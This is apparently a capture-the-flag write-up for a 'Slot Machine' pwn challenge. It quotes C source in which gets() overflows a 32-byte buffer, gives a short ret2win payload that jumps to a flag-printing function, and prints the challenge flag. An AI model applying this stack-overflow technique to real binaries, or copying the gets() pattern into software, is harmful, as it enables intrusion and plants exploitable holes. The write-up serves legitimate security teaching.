# Slot Machine

## Description

Yay Dal just installed a slot machine for all students! Maybe I can pay my tuition if I hit big!

## Solution Walkthrough

1. **Step 1**：

    After reading the source code provided by the challenge, we can find the function that gives us the flag:

    ```c
    void jackpot() {
        FILE *f = fopen("flag.txt", "r");
        if (!f) {
            puts("flag.txt not found");
            exit(1);
        }
        char flag[64];
        fgets(flag, sizeof(flag), f);
        fclose(f);
        puts("JACKPOT! How could that happen?");
        printf("Flag: %s\n", flag);
    }
    ```

    However, under normal circumstances, it is impossible to reach jackpot:

    ```c
    // Pick 3 distinct symbols (guaranteed no match)
    int a = rand() % NUM_SYMS;
    int b;
    do { b = rand() % NUM_SYMS; } while (b == a);
    int c;
    do { c = rand() % NUM_SYMS; } while (c == a || c == b);
    ```

2. **Step 2**：

    Since there is no input length limit, and cmd is only 32 bytes, we can use ret2win:

    ```c
    void game_loop() {
        char cmd[32];

        while (1) {
            printf("\nCoins: %d\n> ", coins);
            fflush(stdout);

            if (!gets(cmd)) break;
            ...
    ```

    Script:

    ```python
    payload = b"A" * 40
    payload += p64(ret)
    payload += p64(jackpot)
    payload += p64(exit_plt)
    ```

    The 40 A's are used to fill cmd and saved rbp. The ret gadget is used to align the stack, then execution jumps to jackpot. After getting the flag, the program exits.

## Flag

```text
dalctf{u_0n3_0f_th053_0ld_dud3s_add1ct3d_t0_sl0t_m4ch1n35}
```
